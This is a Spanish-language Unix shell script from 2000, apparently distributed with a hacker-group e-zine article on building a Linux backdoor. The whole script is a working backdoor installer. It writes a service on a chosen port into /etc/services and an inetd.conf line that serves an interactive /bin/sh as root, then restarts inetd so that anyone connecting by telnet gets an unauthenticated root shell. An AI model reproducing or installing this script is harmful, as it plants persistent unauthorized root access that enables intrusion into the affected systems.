#!/bin/sh

######################################################
## RaZa-BaCkDooR v666.666.666                       ##
##--------------------------------------------------##
## Este es un sencillo script de Sh que             ##
## viene con este numero de RaZa-MeXiCaNa.          ##
## Es parte del articulo:                           ##
## "Armando un Backdoor en Linux".                  ##
##--------------------------------------------------##
## Como usarlo:                                     ##
##                                                  ##
## <root@microsoft.com #> sh raza-bdoor.sh <puerto> ##
##                                                  ##
## Por ejemplo, para tener instalar el backdoor     ##
## en el puerto 666, debemos escribir:              ##
##                                                  ##
## <root@microsoft.com #> sh raza-bdoor.sh 666      ##
##--------------------------------------------------##
## Script hecho por [Hellraiser] para RaZa-MeXiCaNa ##
## -( [Hellraiser] - <hell@raza-mexicana.org> )-    ##
######################################################
           # Tue Jul 11 17:51:05 ART 2000 #
           ################################

##[ Variables ]##
SERVICES=/etc/services
INETD=/etc/inetd.conf

if [ "$#" != 1 ]; then
	echo "[1;37m::[[1;32m RaZa[1;37mBaCk[1;31mDooR[1;37m v666.666.666 ]::[0;37m"
	echo " "
	echo "[1;37mUSO[0;37m: [1;36m$0 [1;33m[puerto][0;37m"
	echo " "
	echo "[1;37m.:( Programado por [1;36m[Hel[1;37mlrai[1;36mser] [1;37m):.[0;37m"
 	exit 0
fi

echo "[1;37m::[[1;32m RaZa[1;37mBaCk[1;31mDooR[1;37m v666.666.666 ]::[0;37m"
echo " "
echo "[1;37mInstalando Backdoor[0;37m...[0;37m"
echo " " >> $SERVICES
echo "RaZa   $1/tcp" >> $SERVICES
echo " " >> $INETD
echo "RaZa        stream   tcp   nowait   root   /bin/sh             /bin/sh -i" >> $INETD
killall -HUP inetd && inetd 2> /dev/null
echo "[1;39mBackdoor Instalado Correctamente![0;37m"
echo "[1;37mAhora haz[0;37m: [1;31mtelnet <[0;31mipdeestapc[1;31m> $1[0;37m"
echo " "
echo "[1;37m.:( Programado por [1;36m[Hel[1;37mlrai[1;36mser] [1;37m):.[0;37m"
exit 0

